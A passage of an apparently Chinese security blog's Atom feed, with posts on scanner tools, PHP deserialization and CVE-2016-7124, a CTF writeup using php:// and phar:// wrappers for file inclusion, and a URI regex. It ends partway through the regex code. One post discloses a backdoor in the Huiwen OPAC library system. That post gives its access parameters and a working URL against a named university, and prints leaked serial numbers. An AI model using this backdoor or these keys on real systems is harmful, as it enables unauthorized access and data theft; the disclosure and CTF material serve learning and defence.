<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>喜欢冒险探索的程序猿</title>
  <subtitle>喜欢冒险探索的程序猿</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.nudtcat.org/"/>
  <updated>2016-12-19T09:06:18.000Z</updated>
  <id>http://blog.nudtcat.org/</id>
  
  <author>
    <name>nudtcat</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>scanner组件</title>
    <link href="http://blog.nudtcat.org/WebSecurity/scanner%E7%BB%84%E4%BB%B6/"/>
    <id>http://blog.nudtcat.org/WebSecurity/scanner组件/</id>
    <published>2016-12-19T09:00:45.000Z</published>
    <updated>2016-12-19T09:06:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>扫描器基本组件。每个文件可以单独使用。<a href="https://github.com/nudtcat/scanner" target="_blank" rel="external">github地址</a></p>
<p>1-spider_domain.py用来爬取一个网站上所有链接的域名。-u指定url，-d指定爬取深度。<br><a id="more"></a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">usage: 1-spider_domain.py [-h] [-u] [<span class="_">-d</span>]</div><div class="line"></div><div class="line">Spider_domain V1.0 to spider a website to get all domains</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help    show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  -u , --url    url</div><div class="line">  <span class="_">-d</span> , --deep   deep to spider</div></pre></td></tr></table></figure></p>
<p>2-domain_to_ip.py来获取域名对应的ip地址，并且把ip地址扩展一个子网。例如爬取到1.1.1.1和1.1.1.254,则1.1.1.0/24都有可能是这个企业的ip段。-s可以制定两个ip距离多少可以将这中间的ip全部看作ip段。为0-3，0为最小。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">usage: 2-domain_to_ip.py [-h] [-i] [-o] [<span class="_">-s</span>]</div><div class="line"></div><div class="line">Domain_to_ip v1.0 to query domain name to ip address and format ip address</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help     show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  -i , --input   input file</div><div class="line">  -o , --out     result out file</div><div class="line">  <span class="_">-s</span> , --scope   format scope,from 0 to 3,0 means a small scope</div></pre></td></tr></table></figure></p>
<p>3-zmap_live.py用来使用zmap扫描存活的ip。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">usage: 3-zmap_live.py [-h] [-i] [-o] [-t]</div><div class="line"></div><div class="line">Zmap_live V1.0 to scan <span class="keyword">for</span> live hosts</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help     show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  -i , --input   input file</div><div class="line">  -o , --out     result out file</div><div class="line">  -t , --times   Retry <span class="built_in">times</span> <span class="keyword">in</span> <span class="keyword">case</span> zmap scan failed!</div></pre></td></tr></table></figure></p>
<p>3-zmap_port.py用来扫描开放的端口。-l范围为1-3，代表扫描开放端口的范围大小，1为最小。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">usage: 3-zmap_port.py [-h] [-i] [-o] [-t] [<span class="_">-l</span>]</div><div class="line"></div><div class="line">Zmap_port V1.0 to scan <span class="keyword">for</span> open port</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help     show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  -i , --input   input file</div><div class="line">  -o , --out     result out file</div><div class="line">  -t , --times   Retry <span class="built_in">times</span> <span class="keyword">in</span> <span class="keyword">case</span> zmap scan failed!</div><div class="line">  <span class="_">-l</span> , --level   level of ports to scan,1-3,1 means the least</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;扫描器基本组件。每个文件可以单独使用。&lt;a href=&quot;https://github.com/nudtcat/scanner&quot;&gt;github地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1-spider_domain.py用来爬取一个网站上所有链接的域名。-u指定url，-d指定爬取深度。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/categories/WebSecurity/"/>
    
    
      <category term="扫描器" scheme="http://blog.nudtcat.org/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>集训有感</title>
    <link href="http://blog.nudtcat.org/Chat/%E9%9B%86%E8%AE%AD%E6%9C%89%E6%84%9F/"/>
    <id>http://blog.nudtcat.org/Chat/集训有感/</id>
    <published>2016-12-19T08:04:57.000Z</published>
    <updated>2016-12-19T08:23:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>回去训练了一个月，天天累成废狗🐶。又回来休整几天，有感。<br><a id="more"></a></p>
<ul>
<li>温水煮青蛙，生活就是温水，无论是没有压力的，还是高压力的。</li>
<li>行动，永远不停止行动。思考在行动途中的。</li>
<li>勤于战术，明于战略。</li>
<li>自我驱动。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;回去训练了一个月，天天累成废狗🐶。又回来休整几天，有感。&lt;br&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.nudtcat.org/categories/Chat/"/>
    
    
      <category term="大学生活" scheme="http://blog.nudtcat.org/tags/%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>魔术方法,CVE-2016-7124与反序列化漏洞</title>
    <link href="http://blog.nudtcat.org/WebSecurity/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-CVE-2016-7124%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.nudtcat.org/WebSecurity/魔术方法-CVE-2016-7124与反序列化漏洞/</id>
    <published>2016-11-11T12:15:59.000Z</published>
    <updated>2016-11-11T13:14:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-魔法方法"><a href="#0x01-魔法方法" class="headerlink" title="0x01 魔法方法"></a>0x01 魔法方法</h2><p>魔法方法，是一种特殊的方法，如果定义了，它会在调用一些方法之前自动运行。在很多语言中都有魔法方法，例如，在php中，如果在一个类中定义了__construct方法，在这个类初始化时，它会被自动调用。__sleep()方法会在serialize()方法调用之前调用，__wakeup方法会在调用unserialize()方法之前调用，这些都是php自行规定的，开发者必须使用规定的方法名，才能触发魔法方法的自动运行。在Python中，魔法方法更加常见，例如__init__方法等。<br><a id="more"></a></p>
<h2 id="0x02-序列化与反序列化"><a href="#0x02-序列化与反序列化" class="headerlink" title="0x02 序列化与反序列化"></a>0x02 序列化与反序列化</h2><p>序列化是指把面向对象的对象变成二进制的能持续存储的文件。反序列化则是相反，将二进制的文件转换成对象，使他活起来。序列化与反序列化一般成对的，例如，在Python中有好几种序列化和反序列化方法，pickle定义了一对，使用pickle序列化后的必需使用pickle反序列化。php中，可以直接使用serialize()和unserialize()方法来序列化和反序列化。因为下面要说的漏洞是关于php的，下面详细说一下php的序列化和反序列化<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sample1</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $a=<span class="string">"Sample_str"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> $a;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sample2</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $a=<span class="string">"Sample_str"</span>;</div><div class="line">&#125;</div><div class="line">$i=<span class="number">5</span>;</div><div class="line">$str=<span class="string">"hello world"</span>;</div><div class="line">$arr=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</div><div class="line">$obj1=<span class="keyword">new</span> Sample1();</div><div class="line">$obj2=<span class="keyword">new</span> Sample2();</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($i);</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($str);</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($arr);</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($obj1);</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($obj2);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>运行结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">i:5;</div><div class="line">s:11:&quot;hello world&quot;;</div><div class="line">a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;</div><div class="line">O:6:&quot;Sample&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;Sample_str&quot;;&#125;</div><div class="line">O:6:&quot;Sample&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;Sample_str&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>可见，在类的实例序列化以后，只会将变量名字类型以及值保存下来，并不会保存类的方法。反序列化函数能把上述的字符串转换回原来的对象。</p>
<h2 id="0x03-反序列化漏洞"><a href="#0x03-反序列化漏洞" class="headerlink" title="0x03 反序列化漏洞"></a>0x03 反序列化漏洞</h2><p>如果unserialize()函数的参数可控，那么我们就可以控制反序列化后对象中变量的值，如果原来代码中有一些危险的方法，我们可以直接调用。虽然利用条件略微苛刻，但是实际中漏洞还是很多。</p>
<h2 id="0x04-CVE-2016-7124"><a href="#0x04-CVE-2016-7124" class="headerlink" title="0x04 CVE-2016-7124"></a>0x04 CVE-2016-7124</h2><p>这是PHP的一个漏洞，利用环境是PHP5 &lt; 5.6.25 ，PHP7 &lt; 7.0.10。简单来说，就是当序列化字符串中表示对象中属性个数的数字大于真实个数时，就会跳过__wakeup()函数的执行。例子可以参见2016 SWPU CTF中的Web3题</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-魔法方法&quot;&gt;&lt;a href=&quot;#0x01-魔法方法&quot; class=&quot;headerlink&quot; title=&quot;0x01 魔法方法&quot;&gt;&lt;/a&gt;0x01 魔法方法&lt;/h2&gt;&lt;p&gt;魔法方法，是一种特殊的方法，如果定义了，它会在调用一些方法之前自动运行。在很多语言中都有魔法方法，例如，在php中，如果在一个类中定义了__construct方法，在这个类初始化时，它会被自动调用。__sleep()方法会在serialize()方法调用之前调用，__wakeup方法会在调用unserialize()方法之前调用，这些都是php自行规定的，开发者必须使用规定的方法名，才能触发魔法方法的自动运行。在Python中，魔法方法更加常见，例如__init__方法等。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/categories/WebSecurity/"/>
    
    
      <category term="php漏洞" scheme="http://blog.nudtcat.org/tags/php%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Web漏洞" scheme="http://blog.nudtcat.org/tags/Web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>汇文opac图书馆后门导致源码泄漏</title>
    <link href="http://blog.nudtcat.org/WebSecurity/%E6%B1%87%E6%96%87opac%E5%9B%BE%E4%B9%A6%E9%A6%86%E5%90%8E%E9%97%A8%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F/"/>
    <id>http://blog.nudtcat.org/WebSecurity/汇文opac图书馆后门导致源码泄漏/</id>
    <published>2016-11-08T11:13:58.000Z</published>
    <updated>2016-11-11T12:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>汇文的libsys图书馆opac系统是高校使用得比较多的系统，用户有厦大，南京大学，大连理工，南开大学等多所学校。系统使用的是Oracle＋php，无法从公开触到获取源码。<br><a id="more"></a></p>
<h2 id="0x01-获取代码"><a href="#0x01-获取代码" class="headerlink" title="0x01 获取代码"></a>0x01 获取代码</h2><p>在汇文图书馆的官网上，可以下载到一些补丁，如截图所示。<img src="/images/161108_01.png" alt=""><br>下载OPAC重要安全BUG更新，可以看到一部分php文件，php使用了DeZend加密，可以使用工具解密，其中，/opac/ajax_libsys_view.php文件代码如下所示</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/*********************/</div><div class="line">/*                   */</div><div class="line">/*  Dezend for PHP5  */</div><div class="line">/*         NWS       */</div><div class="line">/*      Nulled.WS    */</div><div class="line">/*                   */</div><div class="line">/*********************/</div><div class="line"></div><div class="line">require_once( "common.php" );</div><div class="line">require_once( "../include/hwopacpwd.php" );</div><div class="line">$pwd = $_REQUEST['code'];</div><div class="line">$crc = $_REQUEST['crc'];</div><div class="line">$date = strrev( date( "md" ) );</div><div class="line">if ( $pwd != "huiwen_opac" || $date != $crc )</div><div class="line">&#123;</div><div class="line">				echo "ERROR";</div><div class="line">				return;</div><div class="line">&#125;</div><div class="line">$ary = array( );</div><div class="line">$strSql = " SELECT * from v\$version ";</div><div class="line">$stmt = $dbh-&gt;prepare( $strSql );</div><div class="line">$stmt-&gt;execute( );</div><div class="line">$mode = OCI_FETCHSTATEMENT_BY_ROW;</div><div class="line">$version = $stmt-&gt;fetchall( $mode );</div><div class="line">$i = 0;</div><div class="line">for ( ;	$i &lt; count( $version );	++$i	)</div><div class="line">&#123;</div><div class="line">				$ary[] = array( "or" =&gt; $version[$i]['BANNER'] );</div><div class="line">&#125;</div><div class="line">$strSql = "SELECT  sys_para_code,sys_para_value FROM  sys_comm_para where sys_para_code in ('01','02','14','16','17','24','47','98','99','ACS','RFID','THREE-M' ) order by 1 ";</div><div class="line">$stmt = $dbh-&gt;prepare( $strSql );</div><div class="line">$stmt-&gt;execute( );</div><div class="line">$mode = OCI_FETCHSTATEMENT_BY_ROW;</div><div class="line">$para = $stmt-&gt;fetchall( $mode );</div><div class="line">$i = 0;</div><div class="line">for ( ;	$i &lt; count( $para );	++$i	)</div><div class="line">&#123;</div><div class="line">				$ary[] = array( trim( $para[$i]['SYS_PARA_CODE'] ) =&gt; str2utf8( $para[$i]['SYS_PARA_VALUE'] ) );</div><div class="line">&#125;</div><div class="line">$strSql = "SELECT  password FROM  lib_worker where  wkr_no='ROOT' ";</div><div class="line">$stmt = $dbh-&gt;prepare( $strSql );</div><div class="line">$stmt-&gt;execute( );</div><div class="line">$root = $stmt-&gt;fetch( );</div><div class="line">$ary[] = array( "RT" =&gt; $root['PASSWORD'] );</div><div class="line">$strSql = " select count(*) as cnt from marc ";</div><div class="line">$stmt = $dbh-&gt;prepare( $strSql );</div><div class="line">$stmt-&gt;execute( );</div><div class="line">$root = $stmt-&gt;fetch( );</div><div class="line">$ary[] = array( "M" =&gt; $root['CNT'] );</div><div class="line">$strSql = " select count(*) as cnt from indi_acct ";</div><div class="line">$stmt = $dbh-&gt;prepare( $strSql );</div><div class="line">$stmt-&gt;execute( );</div><div class="line">$root = $stmt-&gt;fetch( );</div><div class="line">$ary[] = array( "I" =&gt; $root['CNT'] );</div><div class="line">$strSql = " select count(*) as cnt from reader where redr_flag=1 ";</div><div class="line">$stmt = $dbh-&gt;prepare( $strSql );</div><div class="line">$stmt-&gt;execute( );</div><div class="line">$root = $stmt-&gt;fetch( );</div><div class="line">$ary[] = array( "R" =&gt; $root['CNT'] );</div><div class="line">foreach ( $ary as $item )</div><div class="line">&#123;</div><div class="line">				print_r( $item );</div><div class="line">				echo "&lt;br/&gt;";</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>可以看到，只要输入正确的code和crc即可执行if逻辑后面的一系列sql查询语句。<br>以厦门大学为例：<a href="http://opac.xmulib.org/opac/ajax_libsys_view.php?code=huiwen_opac&amp;crc=8011" target="_blank" rel="external">http://opac.xmulib.org/opac/ajax_libsys_view.php?code=huiwen_opac&amp;crc=8011</a><br>crc为月份日期按照倒序排列，例如今天是11月8日，则为1108倒序，即8011，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Array ( [or] =&gt; Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bi ) </div><div class="line">Array ( [or] =&gt; PL/SQL Release 10.2.0.1.0 - Production ) </div><div class="line">Array ( [or] =&gt; CORE	10.2.0.1.0	Production ) </div><div class="line">Array ( [or] =&gt; TNS for Solaris: Version 10.2.0.1.0 - Production ) </div><div class="line">Array ( [or] =&gt; NLSRTL Version 10.2.0.1.0 - Production ) </div><div class="line">Array ( [01] =&gt; 厦门大学 ) </div><div class="line">Array ( [02] =&gt; http://210.34.4.28 ) </div><div class="line">Array ( [14] =&gt; XMU,235010 ) </div><div class="line">Array ( [16] =&gt; 7050-7901-9735-7268-7661-9231-6348 ) </div><div class="line">Array ( [17] =&gt; Enterprise ) </div><div class="line">Array ( [24] =&gt; 5048535745485245495545207195195197180243209167205188202233185221 ) </div><div class="line">Array ( [47] =&gt; 0 ) </div><div class="line">Array ( [98] =&gt; 3174-19803-0843-1589-15002 ) </div><div class="line">Array ( [99] =&gt; 5.5.10 ) </div><div class="line">Array ( [RFID] =&gt; 2640-011-913-785 ) </div><div class="line">Array ( [THREE-M] =&gt; 2640-011-913-785 ) </div><div class="line">Array ( [RT] =&gt; ) </div><div class="line">Array ( [M] =&gt; 2332777 ) </div><div class="line">Array ( [I] =&gt; 4495757 ) </div><div class="line">Array ( [R] =&gt; 85492 )</div></pre></td></tr></table></figure></p>
<p>其中，7050-7901-9735-7268-7661-9231-6348即为产品序列号，可以去官网下载完整安装包。<br><img src="/images/161108_02.png" alt=""><br>安装，在hwweb下即为php源码，使用Dezend解密程序解密即可拿到所有源码</p>
<h2 id="0x03-后续"><a href="#0x03-后续" class="headerlink" title="0x03 后续"></a>0x03 后续</h2><p>这个漏洞属于官方后门无疑，拿到源码后，正在审计中。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h2&gt;&lt;p&gt;汇文的libsys图书馆opac系统是高校使用得比较多的系统，用户有厦大，南京大学，大连理工，南开大学等多所学校。系统使用的是Oracle＋php，无法从公开触到获取源码。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/categories/WebSecurity/"/>
    
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞" scheme="http://blog.nudtcat.org/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>SWPU CTF writeup</title>
    <link href="http://blog.nudtcat.org/CTF/SWPU-CTF-writeup/"/>
    <id>http://blog.nudtcat.org/CTF/SWPU-CTF-writeup/</id>
    <published>2016-10-28T10:53:07.000Z</published>
    <updated>2016-11-08T10:56:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-概括"><a href="#0x00-概括" class="headerlink" title="0x00 概括"></a>0x00 概括</h2><p>这是我第一次参加CTF比赛。逆向小白，隐写小白，但是做出了所有的隐写题。最擅长Web方向(和编程)，而Web题做得不多。Web方向的知识还是不牢固，技巧不够熟练，实践经验不足。</p>
<p>比赛结果当然不太好，排名42。</p>
<p>我按照顺序题目分类写写writeup吧。</p>
<a id="more"></a>
<h2 id="0x01-MISC-隐写题"><a href="#0x01-MISC-隐写题" class="headerlink" title="0x01 MISC 隐写题"></a>0x01 MISC 隐写题</h2><h3 id="做出的"><a href="#做出的" class="headerlink" title="做出的"></a>做出的</h3><h4 id="MISC2-150分"><a href="#MISC2-150分" class="headerlink" title="MISC2 150分"></a>MISC2 150分</h4><p>先从MISC2开始吧(并没有MISC1)。文件是一段流量的抓包，使用wireshark提取文件，其中有一个请求flag.zip的HTTP请求，提取flag.zip，解压得到一个ce.txt文件。大致如下图所示<br><img src="/images/161028_01.png" alt=""><br>第一次打CTF，不太熟悉套路，看了好久才发现可能是RGB值。行数为98457=887*111，可能就是长宽了。用Python PIL写了个脚本，图片还原如下<br><img src="/images/161028_02.bmp" alt=""></p>
<h4 id="MISC3-100分"><a href="#MISC3-100分" class="headerlink" title="MISC3 100分"></a>MISC3 100分</h4><p>MISC3是一个图片，利用Google搜图搜到原图，对比发现最后增加了一串字符，OZRGW4L3OVVUG22TL53HEZDVPJ2HKY2DKZIVQVTVOZ5HKY3LOJ3HIWSEKVBFIR2ZKNVXMY3LOR3H2===，看到等号应该想到base64，看到三个等号应该想到不是base64。实际上是base32编码，解码得到vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}。感觉前四个应该是flag，初步怀疑是凯撒密码，后来发现ascii码的奇偶不同，位移方向不同，写个脚本得到flag。</p>
<h4 id="MISC4-100分"><a href="#MISC4-100分" class="headerlink" title="MISC4 100分"></a>MISC4 100分</h4><p>fuck.html，长这样<br><img src="/images/161028_03.png" alt=""><br>很显然这个是jsfuck，直接运行即可查看结果，如下图<br><img src="/images/161028_04.png" alt=""><br>弹出结果为brianfuck加密，解密即可得到flag</p>
<h2 id="0x02-Web"><a href="#0x02-Web" class="headerlink" title="0x02 Web"></a>0x02 Web</h2><h3 id="做出的-1"><a href="#做出的-1" class="headerlink" title="做出的"></a>做出的</h3><h4 id="Web-100"><a href="#Web-100" class="headerlink" title="Web 100"></a>Web 100</h4><p>这是一道文件包含方面的题目，Tips1是include.php。请求include.php，提示Tips: the parameter is file! :)查看html源码，发现upload.php，这是一道上传文件包含的题目，如果是纯上传就不会有include.php，所以上传应该限制比较死。首先利用php://filter/convert.base64-encode/resource=include拿到include.php的源码，这里有个坑，文件名不能是include.php，这不科学，但是看到源码后就知道了。base64 decode得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">@$file = $_GET[<span class="string">"file"</span>];</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</div><div class="line">    &#123;</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>过滤了http等远程协议，不能使用php://input，不能利用%00和多个./截断。还会在文件名后面加.php后缀，而显然无法上传php文件。在这里，有两种文件可以突破限制，一种是利用zip://伪协议，另一种是phar://伪协议。zip不行，phar可以，即可拿到shell，在当前目录下有一个文件，swpu_wbe2_tips.txt，内含flag和下一道题的提示。</p>
<h2 id="0x03-完整Writeup"><a href="#0x03-完整Writeup" class="headerlink" title="0x03 完整Writeup"></a>0x03 完整Writeup</h2><p><a href="http://bobao.360.cn/ctf/detail/173.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/173.html</a><br><a href="http://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/" target="_blank" rel="external">http://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-概括&quot;&gt;&lt;a href=&quot;#0x00-概括&quot; class=&quot;headerlink&quot; title=&quot;0x00 概括&quot;&gt;&lt;/a&gt;0x00 概括&lt;/h2&gt;&lt;p&gt;这是我第一次参加CTF比赛。逆向小白，隐写小白，但是做出了所有的隐写题。最擅长Web方向(和编程)，而Web题做得不多。Web方向的知识还是不牢固，技巧不够熟练，实践经验不足。&lt;/p&gt;
&lt;p&gt;比赛结果当然不太好，排名42。&lt;/p&gt;
&lt;p&gt;我按照顺序题目分类写写writeup吧。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://blog.nudtcat.org/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.nudtcat.org/tags/CTF/"/>
    
      <category term="writeup" scheme="http://blog.nudtcat.org/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>uri提取正则表达式</title>
    <link href="http://blog.nudtcat.org/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/uri%E6%8F%90%E5%8F%96%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://blog.nudtcat.org/正则表达式/uri提取正则表达式/</id>
    <published>2016-10-13T13:33:05.000Z</published>
    <updated>2016-10-14T03:23:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>uri的格式多种多样，经常需要校验uri或者分析uri提取各部分，下面提供一个自己写的正则表达式来提取uri，我用它来分析扫描器中输入的或者爬取到的uri，优先提取，由于水平有限，未能完全校验uri是否合法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">url_parse_re = <span class="string">r"^(\w*):\/\/(?:([^:]*)?(?::(.*))?@)?([0-9.\-A-Za-z]+)(?::(\d+))?(?:\/([^?#]*))?(?:\?([^#]*))?(?:#(.*))?$"</span></div><div class="line"><span class="string">"""</span></div><div class="line">^(\w*):\/\/</div><div class="line">(?:       ([^:]*)?(?::(.*))?       @)?</div><div class="line">([0-9.\-A-Za-z]+)</div><div class="line">(?::(\d+))?</div><div class="line">(?:\/([^?#]*))?</div><div class="line">(?:\?([^#]*))?</div><div class="line">(?:#(.*))?$</div><div class="line"></div><div 